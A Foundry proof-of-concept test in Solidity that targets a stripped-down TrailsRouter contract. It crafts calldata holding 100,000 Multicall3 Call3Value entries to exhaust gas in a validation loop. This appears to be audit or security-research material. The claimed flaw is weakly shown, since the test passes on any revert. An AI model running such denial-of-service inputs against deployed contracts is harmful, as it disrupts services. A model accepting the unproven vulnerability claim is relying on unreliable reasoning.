// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMulticall3 {
    struct Call3Value {
        address target;
        bytes callData;
        uint256 value;
        bool allowFailure;
    }
}

contract TrailsRouter {
    function _validateRouterCall(bytes memory callData) public pure {
        IMulticall3.Call3Value[] memory calls = abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]));
        for (uint256 i = 0; i < calls.length; i++) {
            if (calls[i].allowFailure) {
                revert("AllowFailureMustBeFalse");
            }
        }
    }

    function _sliceCallData(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[start + i];
        }
        return result;
    }
}

contract ExploitTest is Test {
    TrailsRouter router;

    function setUp() public {
        // Deploy the TrailsRouter contract
        router = new TrailsRouter();
    }

    function test_exploit() public {
        // Step 1: Craft a large callData input with many Call3Value elements
        uint256 largeNumberOfCalls = 100000; // Large enough to cause gas exhaustion
        bytes memory callData = abi.encodePacked(
            bytes4(keccak256("_validateRouterCall(bytes)")),
            abi.encode(new IMulticall3.Call3Value[](largeNumberOfCalls))
        );

        // Step 2: Attempt to call the vulnerable function
        vm.expectRevert(); // Expect the transaction to revert due to out-of-gas
        router._validateRouterCall(callData);

        // Step 3: Assert the vulnerability
        // The test will pass if the transaction reverts due to gas exhaustion
    }
}